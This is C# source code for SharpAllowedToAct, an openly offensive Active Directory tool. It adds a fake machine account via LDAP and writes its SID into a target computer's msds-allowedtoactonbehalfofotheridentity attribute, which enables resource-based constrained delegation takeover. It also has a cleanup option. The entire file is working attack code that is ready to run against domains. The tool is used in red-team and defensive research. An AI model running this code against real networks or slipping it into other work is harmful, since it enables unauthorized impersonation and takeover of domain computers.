using System;
using System.Text;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Collections.Generic;

namespace SharpAllowedToAct
{
    class Program
    {
        public static void Usage()
        {
            Console.WriteLine("\r\nSharpAllowedToAct - Computer Object Takeover Through RBCD\r\n");

            Console.WriteLine(" Arguments:");
            Console.WriteLine(
                "  /fakecomp - Set the name of the new machine.\r\n" +
                "  /pass - Set the password for the new machine.\r\n" +
                "  /computer - Set the name of the target computer you want to exploit. Need to have write access to the computer object.\r\n" +
                "  /domain - Set the target domain.\r\n" +
                "  /dc - Set the domain controller to use.\r\n" +
                "  /cleanup - Empty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (true or false). Must be combined with /fakecomp. Default is false.\r\n");

            Console.WriteLine(" Examples:");
            Console.WriteLine(
                "  SharpAllowedToAct.exe /fakecomp:FAKECOMP /pass:PASSWORD /computer:COMPUTER\r\n" +
                "  SharpAllowedToAct.exe /fakecomp:FAKECOMP /cleanup:true");
        }

        public static void SetSecurityDescriptor(String Domain, String victim_distinguished_name, String victimcomputer, String sid, bool cleanup)
        {
            // get the domain object of the victim computer and update its securty descriptor 
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
            myldapConnection.Path = "LDAP://" + victim_distinguished_name;
            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(cn=" + victimcomputer + ")";
            string[] requiredProperties = new string[] { "samaccountname" };

            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            System.DirectoryServices.SearchResult result = null;
            try
            {
                result = search.FindOne();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message + "Exiting...");
                return;
            }


            if (result != null)
            {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                String sec_descriptor = "";
                if (!cleanup)
                {
                    sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
                    System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                    byte[] descriptor_buffer = new byte[sd.BinaryLength];
                    sd.GetBinaryForm(descriptor_buffer, 0);
                    // Add AllowedToAct Security Descriptor
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                }
                else
                {
                    // Cleanup attribute
                    Console.WriteLine("[+] Clearing attribute...");
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                }

                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] Attribute changed successfully");
                    Console.WriteLine("[+] Done!");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("[!] Could not update attribute!\nExiting...");
                    return;
                }
            }

            else Console.WriteLine("[!] Computer Account not found!\nExiting...");
            return;
        }

        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Usage();
                    return;
                }
                Dictionary<string, string> arguments = new Dictionary<string, string>();
                foreach (string a in args)
                {
                    int i = a.IndexOf(":");
                    if (i > 0)
                        arguments[a.Substring(1, i - 1)] = a.Substring(i + 1);
                }
                if ((!(arguments.ContainsKey("computer")) && !(arguments.ContainsKey("pass")) && !(arguments.ContainsKey("fakecomp"))) || (!(arguments.ContainsKey("cleanup")) && !(arguments.ContainsKey("fakecomp"))))
                {
                    Usage();
                    return;
                }
                string orEmpty(string key) => arguments.ContainsKey(key) ? arguments[key] : "";

                String TargetDC = orEmpty("dc");
                String Domain = orEmpty("domain");
                String OwnedComp = orEmpty("computer");
                String PasswordClear = orEmpty("pass");
                String Fake = orEmpty("fakecomp");
                String Cleanup = arguments.ContainsKey("cleanup") ? arguments["cleanup"] : "false";


                // If a domain controller and domain were not provide try to find them automatically
                System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
                if (TargetDC == String.Empty || Domain == String.Empty)
                {
                    try
                    {
                        current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                        if (TargetDC == String.Empty)
                        {
                            TargetDC = current_domain.PdcRoleOwner.Name;
                        }

                        if (Domain == String.Empty)
                        {
                            Domain = current_domain.Name;
                        }
                    }
                    catch
                    {
                        Console.WriteLine("[!] Cannot enumerate domain, please specify with /domain and /dc flags.");
                        return;
                    }

                }

                Domain = Domain.ToLower();

                String machine_account = Fake;
                String sam_account = "";
                if (Fake.EndsWith("$"))
                {
                    sam_account = machine_account;
                    machine_account = machine_account.Substring(0, machine_account.Length - 1);
                }
                else
                {
                    sam_account = machine_account + "$";
                }


                String distinguished_name = "";
                String victim_distinguished_name = "";
                String[] DC_array = null;

                distinguished_name = "CN=" + machine_account + ",CN=Computers";
                victim_distinguished_name = "CN=" + OwnedComp + ",CN=Computers";
                DC_array = Domain.Split('.');

                foreach (String DC in DC_array)
                {
                    distinguished_name += ",DC=" + DC;
                    victim_distinguished_name += ",DC=" + DC;
                }

                if (Cleanup != "false")
                {
                    SetSecurityDescriptor(Domain, victim_distinguished_name, OwnedComp, null, true);
                    return;
                }

                Console.WriteLine("[+] Domain = " + Domain);
                Console.WriteLine("[+] Domain Controller = " + TargetDC);
                Console.WriteLine("[+] New SAMAccountName = " + sam_account);
                Console.WriteLine("[+] Distinguished Name = " + distinguished_name);

                System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(TargetDC, 389);
                System.DirectoryServices.Protocols.LdapConnection connection = null;

                connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);

                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();

                var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + PasswordClear + "\"")),
                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)

            });

                try
                {
                    connection.SendRequest(request);
                    Console.WriteLine("[+] Machine account " + machine_account + " added");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.)");
                    Console.WriteLine("[-] Exception: " + ex.Message);
                    return;
                }

                // Get SID of the new computer object
                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
                SecurityIdentifier sid = null;

                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
                {
                    try
                    {
                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                        Console.Out.WriteLine("[+] SID of New Computer: " + sid.Value);
                    }
                    catch
                    {
                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
                        return;
                    }
                }

                SetSecurityDescriptor(Domain, victim_distinguished_name, OwnedComp, sid.Value, false);
            }

            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
            }
        }
    }
}


